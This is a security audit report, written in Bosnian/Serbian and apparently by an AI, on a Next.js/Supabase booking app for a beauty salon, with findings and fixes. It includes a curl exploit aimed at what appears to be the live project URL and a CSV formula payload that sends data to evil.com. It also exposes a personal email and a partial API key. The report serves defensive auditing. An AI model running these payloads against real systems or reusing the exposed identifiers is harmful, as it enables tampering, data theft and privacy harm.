# Adversarial Security Audit — UP Beauty

**Datum:** 2026-05-26
**Projekat:** up-beauty (Next.js 16 + Supabase)
**Tip:** Adversarial / red-team analiza — "pokvari aplikaciju"
**Auditor:** Claude Opus 4.7

---

## Rezime

| Ozbiljnost | Broj | Opis |
|------------|------|------|
| KRITIČNO   | 4    | RLS policy bypass, secrets na disku, env vars sa `\n` |
| VISOKO     | 8    | Rate limit bypass, CSP neaktivna, CSV injection, login brute-force |
| SREDNJE    | 7    | Nema CAPTCHA, booking bypass, 10MB body, realtime PII leak |
| NISKO      | 7    | Error leakage, IDOR token u URL, ICS collision, PII u env.example |
| **UKUPNO** | **26** | |

---

## KRITIČNI PROPUSTI

### K1. RLS Policy Name Mismatch — Tightened Insert Policy Ne Radi

**Fajlovi:**
- `supabase/migrations/20260409100100_rls_policies.sql:79` — kreira `"appointments: public insert"` sa `WITH CHECK (true)`
- `supabase/migrations/20260422_tighten_rls.sql:6` — dropuje `"appointments: anon insert"` (POGREŠNO IME)

**Problem:** Originalna migracija kreira policy pod imenom `"appointments: public insert"`. Kasnija migracija pokušava zamijeniti ovu politiku, ali dropuje `"appointments: anon insert"` — što je DRUGO ime. `DROP POLICY IF EXISTS` tiho uspije (ne postoji policy tog imena), a zatim `CREATE POLICY` kreira DRUGU policy pored originalne. PostgreSQL RLS koristi OR logiku između politika istog tipa — originalna `WITH CHECK (true)` i dalje postoji i dozvoljava SVE.

**Eksploatacija:**
```bash
curl -X POST "https://ljxggwpzljtjeeljtqts.supabase.co/rest/v1/appointments" \
  -H "apikey: <ANON_KEY_IZ_CLIENT_BUNDLE>" \
  -H "Content-Type: application/json" \
  -d '{"status":"potvrdjen","client_name":"Haker","client_phone":"+38761000000","start_time":"2026-06-01T10:00:00Z","end_time":"2026-06-01T11:00:00Z","service_id":1}'
```
Napadač može direktno ubaciti termin sa statusom `potvrdjen` zaobilazeći sve poslovne provjere.

**Uticaj:** Fake potvrđeni termini, manipulacija poslovnim podacima, DoS putem popunjavanja svih slotova.

**Popravka:**
```sql
DROP POLICY IF EXISTS "appointments: public insert" ON public.appointments;
DROP POLICY IF EXISTS "training_inquiries: public insert" ON public.training_inquiries;
```

---

### K2. RLS Politike Daju ANY Authenticated Korisniku Pun Pristup

**Fajl:** `supabase/migrations/20260409100100_rls_policies.sql` — SVE tabele

**Problem:** Svaka tabela ima policy `FOR ALL TO authenticated USING (true) WITH CHECK (true)`. U Supabase, `authenticated` znači BILO KO sa validnim JWT-om — ne samo admin. Aplikacijski sloj provjerava `isAdminEmail()`, ali baza podataka je potpuno otvorena.

Konfiguracija u `config.toml` ima `enable_signup = false` na top-level-u ali `[auth.email] enable_signup = true` — moguć konflikt zavisno od verzije Supabase CLI.

**Eksploatacija:** Ako se signup ikad (re)omogući, ili napadač dobije pristup dashboardu/service_role ključu i kreira korisnika, taj korisnik može:
- Čitati SVE termine (imena klijenata, telefoni, emailovi, napomene)
- Brisati/mijenjati sve podatke (usluge, galeriju, radno vrijeme)
- Potpuno kompromitovati sistem kroz direktne Supabase REST API pozive

**Uticaj:** Kompletna kompromitacija podataka, PII exfiltracija, destrukcija poslovnih podataka.

**Popravka:** Dodati admin-email provjeru u RLS:
```sql
CREATE OR REPLACE FUNCTION public.is_admin()
RETURNS boolean AS $$
  SELECT auth.jwt() ->> 'email' = 'peranovicuna6@gmail.com'
$$ LANGUAGE sql SECURITY DEFINER;

-- Primjer za services:
DROP POLICY "services: authenticated full access" ON public.services;
CREATE POLICY "services: admin full access" ON public.services
  FOR ALL TO authenticated USING (is_admin()) WITH CHECK (is_admin());
```

---

### K3. Storage Politike Dozvoljavaju Bilo Kom Authenticated Upload/Delete

**Fajlovi:**
- `supabase/migrations/20260427000001_storage_policies.sql`
- `supabase/migrations/20260504100000_service_image.sql`

**Problem:** `gallery` i `services` storage bucket-i dozvoljavaju INSERT/UPDATE/DELETE za `authenticated` rolu bez admin provjere. Isti problem kao K2 — bilo ko sa Supabase nalogom može uploadovati ili brisati slike.

**Eksploatacija:** Upload neprikladnog sadržaja ili brisanje svih galerijskih slika kroz direktne Supabase Storage API pozive.

**Uticaj:** Defacement sajta, gubitak galerije, reputaciona šteta.

---

### K4. Produkcijski Secrets na Developmerskom Disku

**Fajl:** `.vercel/.env.production.local`

**Problem:** Sadrži LIVE produkcijske ključeve:
- `SUPABASE_SERVICE_ROLE_KEY` (zaobilazi SVE RLS politike)
- `NEXT_PUBLIC_SUPABASE_ANON_KEY` (produkcijski)
- `RESEND_API_KEY` u `.env.local` (re_NjErGhYA_...)

Bilo ko sa pristupom developmerskom računaru ima potpunu admin kontrolu nad produkcijskom bazom.

**Uticaj:** Potpuna kompromitacija baze, mogućnost slanja emailova u ime biznisa.

**Popravka:** Rotirati `SUPABASE_SERVICE_ROLE_KEY` i `RESEND_API_KEY` odmah. Nikada ne čuvati `.vercel/.env.production.local` na disku.

---

## VISOKI PROPUSTI

### V1. Admin Check u Availability API — Bilo Ko Authenticated Zaobilazi min_hours_before

**Fajlovi:**
- `src/app/api/availability/route.ts:43`
- `src/app/api/availability/month/route.ts:46` (isti problem)

**Problem:**
```typescript
isAdmin = !!user;  // BUG: treba biti isAdminEmail(user.email)
```
Provjera samo gleda da li je korisnik ulogovan, ne da li je admin.

**Popravka:** `isAdmin = !!user && isAdminEmail(user.email)`

---

### V2. Rate Limit Bypass — IP Spoofing via X-Forwarded-For

**Fajlovi:**
- `src/app/api/availability/route.ts:25`
- `src/app/zakazi/actions.ts:31`

**Problem:**
```typescript
const ip = req.headers.get("x-forwarded-for")?.split(",")[0] ?? "unknown";
```
Koristi se PRVI IP iz `X-Forwarded-For` lanca — a to je napadačev spoofed IP. Vercel dodaje pravi IP na KRAJ lanca.

**Eksploatacija:** Svaki request šalje `X-Forwarded-For: <random-ip>` i dobija svježi rate limit window.

**Popravka:** Koristiti Vercel-ov `x-real-ip` header ili uzeti ZADNJI IP iz lanca.

---

### V3. Rate Limiter Fails Open na Serverless-u

**Fajl:** `src/lib/utils/rate-limit.ts:79-81`

**Problem:** Kad Upstash Redis padne, fallback na in-memory Map. Na Vercel serverless, svaka cold-start instanca ima prazan Map = svi requestovi prolaze.

**Uticaj:** Tokom Upstash outage-a, rate limiting je efektivno UGAŠEN.

---

### V4. CSP je Report-Only — Nula XSS Zaštite

**Fajl:** `next.config.ts:28`

**Problem:** Header je `Content-Security-Policy-Report-Only` — browser samo loguje violation, NE blokira ništa. Dodatno, `script-src` sadrži `'unsafe-inline'`.

**Uticaj:** Ako postoji bilo kakav XSS vektor, CSP ga neće blokirati.

**Popravka:** Prebaciti na enforced `Content-Security-Policy` sa nonce-based script-src.

---

### V5. Nema HSTS Headera

**Fajl:** `next.config.ts`

**Problem:** Nedostaje `Strict-Transport-Security` header. Browser neće forsirati HTTPS konekcije.

**Uticaj:** SSL stripping napad — presretanje session cookies i admin kredencijala.

**Popravka:** Dodati `{ key: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" }`

---

### V6. CSV Formula Injection

**Fajl:** `src/lib/utils/csv.ts:27-35`

**Problem:** `csvEscape()` ne sanitizuje formule. Ako ćelija počinje sa `=`, `+`, `-`, `@`, Excel/LibreOffice je izvršava kao formulu.

**Eksploatacija:** Napadač zakaže termin sa `client_name = "=HYPERLINK(\"https://evil.com/steal?c=\"&A1,\"Click\")"`. Kad admin exportuje CSV i otvori u Excel-u, formula se izvrši.

**Uticaj:** Kompromitacija admin workstation-a, exfiltracija podataka.

**Popravka:** Dodati prefix za formula karaktere:
```typescript
const FORMULA_CHARS = /^[=+\-@\t\r]/;
if (FORMULA_CHARS.test(s)) return `"'${s.replace(/"/g, '""')}"`;
```

---

### V7. Nema Rate Limitinga na Admin Login

**Fajl:** `src/components/admin/LoginForm.tsx`

**Problem:** Login forma poziva `sb.auth.signInWithPassword()` direktno sa klijenta bez server-side rate limitinga. Za razliku od booking flow-a koji koristi `checkRateLimit(ip, 5, 60_000)`, login pokušaji su neograničeni sa strane aplikacije.

**Uticaj:** Brute-force i credential stuffing napadi na admin nalog.

---

### V8. Booking Akcija Ne Revalidira Slot Protiv Working Hours / Blocked Dates

**Fajl:** `src/app/zakazi/actions.ts:86-92`

**Problem:** `createAppointment()` provjerava:
- ✅ min_hours_before
- ✅ Clash sa postojećim terminima
- ✅ Grid alignment
- ❌ NE provjerava da li je dan blokiran
- ❌ NE provjerava da li je vrijeme u radnim satima
- ❌ NE provjerava time_blocks

Availability API ispravno generiše slotove sa svim provjerama, ali booking akcija VJERUJE da je poslan validan slot. Napadač zaobilazi UI i šalje proizvoljno vrijeme.

**Eksploatacija:**
```javascript
const fd = new FormData();
fd.set("service_id", "1");
fd.set("start_time", "2026-12-25T23:30:00+01:00"); // Božić u 23:30
fd.set("client_name", "Test");
fd.set("client_phone", "+38761000000");
fd.set("consent", "true");
// POST to server action
```

**Uticaj:** Termini kreirani van radnog vremena, na blokirane datume, ili tokom blokiranih perioda.

---

## SREDNJI PROPUSTI

### S1. Booking Koristi createAdminClient() — DB Defense-in-Depth Je Mrtav Kod

**Fajl:** `src/app/zakazi/actions.ts:58`

**Problem:** Javni booking flow koristi `createAdminClient()` (service_role) koji zaobilazi SVE RLS politike. Tightened RLS iz migracije `20260422_tighten_rls.sql` (koja forsira `status = 'ceka'` za anon INSERT) je **potpuno zaobiđena** — baza nikad ne vidi ovu constraint za primarni booking path.

**Uticaj:** Smanjena defense-in-depth. Ako se ikad doda bug u validaciju, baza neće uhvatiti neispravne statuse.

---

### S2. Nema CAPTCHA na Booking Formi

**Problem:** Jedina zaštita protiv automatizovanih bookinga je rate limiting (5/min/IP) — koji je bypassable (V2). Nema CAPTCHA, nema honeypot polja.

**Eksploatacija:** Napadač flooduje sistem fake bookingima, popunjava sve slobodne slotove za dane/sedmice, efektivno blokirajući pravi biznis.

---

### S3. Server Actions Body Size Limit 10MB

**Fajl:** `next.config.ts:67`

**Problem:** `bodySizeLimit: "10mb"` za SVE server akcije. Galerija ima per-file validaciju (5MB max), ali raw body parsing se dešava PRIJE aplikacijskog koda.

**Uticaj:** Napadač može slati 10MB payload na BILO KOJU server akciju.

---

### S4. Realtime Subscription Leakuje PII

**Fajl:** `supabase/migrations/20260518000000_realtime_appointments.sql`

**Problem:** `appointments` tabela je dodana u `supabase_realtime` sa `REPLICA IDENTITY FULL`. RLS dozvoljava `authenticated` full read — bilo ko authenticated (ne samo admin) prima sve INSERT/UPDATE/DELETE evente sa punim podacima (ime, telefon, email, napomene).

---

### S5. Time Block Razlozi Vidljivi Authenticated Korisnicima

**Problem:** `time_blocks_public` view sakriva `reason` kolonu od anon korisnika, ali `authenticated` ima pun pristup tabeli `time_blocks` (K2). Privatni razlozi poput "zubar" su izloženi.

---

### S6. Dev/Start Skripte Binduju na 0.0.0.0

**Fajl:** `package.json:6,8`

**Problem:** I `dev` i `start` koriste `-H 0.0.0.0`, izlažući server cijeloj lokalnoj mreži. Sa test kredencijalima u `.env.local`, svako na istom WiFi-ju može pristupiti admin panelu.

---

### S7. Trailing \n u Produkcijskim Vercel Env Vars

**Fajl:** `.vercel/.env.production.local`

**Problem:** Svaki env var ima literal `\n` na kraju:
```
NEXT_PUBLIC_SUPABASE_URL="https://ljxggwpzljtjeeljtqts.supabase.co\n"
SUPABASE_SERVICE_ROLE_KEY="eyJ...490\n"
```
Supabase URL i ključevi se koriste RAW bez trimanja. `site-url.ts` obrađuje `NEXT_PUBLIC_SITE_URL`, ali ostali env vars nisu zaštićeni.

**Uticaj:** Potencijalne tihe greške u autentikaciji, nestabilnost sistema.

---

## NISKI PROPUSTI

### N1. Error Poruke Leakuju Supabase Interne Detalje

**Fajlovi:** `src/app/api/availability/route.ts:76,108-127`

Supabase error message se vraća direktno klijentu. Može sadržavati imena tabela, kolona, constraint-a.

### N2. Confirmation Token u URL-u

**Fajl:** `src/app/zakazi/actions.ts:192`

UUID token u query parametru može procuriti kroz browser historiju, referrer headere, analytics.

### N3. ICS UID Predictability

**Fajl:** `src/lib/notifications/send-admin-email.ts:34`

UID baziran na epoch timestamp-u — dva termina u isto vrijeme imaju isti UID, izazivajući calendar conflict.

### N4. Admin Panel URL u Klijent Emailovima

Emailovi klijentima sadrže strukturu admin URL-a, otkrivajući URL pattern admin panela.

### N5. .env.example Sadrži Pravi Email

**Fajl:** `.env.example:9`

`ADMIN_NOTIFICATION_EMAIL=peranovicuna6@gmail.com` — lični email izložen u repo-u.

### N6. Math.random() za Filenames

**Fajl:** `src/app/admin/(protected)/galerija/actions.ts:91`

Nije kriptografski siguran, ali storage putevi su javni pa je uticaj minimalan.

### N7. getEmailNotificationConfig Bez requireAdmin()

**Fajl:** `src/app/admin/(protected)/postavke/email-actions.ts:98-110`

Server akcija dostupna bilo kome ko poznaje action identifier, vraća masked email info.

---

## POZITIVNE SIGURNOSNE PRAKSE

Aplikacija implementira brojne dobre sigurnosne prakse:

1. **HTML escaping u email šablonima** (`escapeHtml`, `escapeHtmlAttr` u templates.ts)
2. **PII sanitizacija u logovima** (`sanitizeError` u log.ts) — briše email i telefon
3. **Image processing via sharp** — validira format preko magic bytes, enforceuje dimenzije, re-enkodira u WebP
4. **Open redirect zaštita** (`safeRedirect`) — sveobuhvatna provjera
5. **Zod schema validacija** na svim korisničkim inputima
6. **Grid alignment enforcement** (`isGridAligned`) — sprječava proizvoljno vrijeme
7. **UUID confirmation tokens** — sprječava IDOR
8. **`server-only` import guard** na admin.ts — sprječava client-side import service role ključa
9. **DB exclusion constraint** (`no_overlapping_appointments`) — defense-in-depth za double-booking
10. **Phone normalizacija** via `libphonenumber-js`
11. **Env fajlovi NIKAD komitovani** u git — provjere sa `git log` potvrđuju

---

## PRIORITETNI PLAN POPRAVKI

### Odmah (prije produkcije)
1. **K1** — Dodati migraciju koja dropuje originalne policy-je sa ispravnim imenima
2. **K2** — Implementirati `is_admin()` SQL funkciju i zamijeniti sve `TO authenticated` RLS politike
3. **K3** — Dodati admin provjeru u storage politike
4. **K4** — Rotirati `SUPABASE_SERVICE_ROLE_KEY` i `RESEND_API_KEY`
5. **V8** — Dodati server-side revalidaciju slota (working hours, blocked dates, time blocks)
6. **V6** — Dodati formula injection zaštitu u csvEscape()

### Sljedeća sedmica
7. **V2** — Zamijeniti `x-forwarded-for[0]` sa `x-real-ip`
8. **V1** — Popraviti `isAdmin = !!user` → `isAdmin = !!user && isAdminEmail(user.email)`
9. **V4** — Prebaciti CSP iz Report-Only u enforced
10. **V5** — Dodati HSTS header
11. **S7** — Fixati trailing `\n` u Vercel env vars

### Planirati
12. **S2** — Dodati Cloudflare Turnstile na booking formu
13. **V7** — Dodati rate limiting na login
14. **S1** — Razdvojiti booking INSERT na anon klijenta za DB-level provjeru
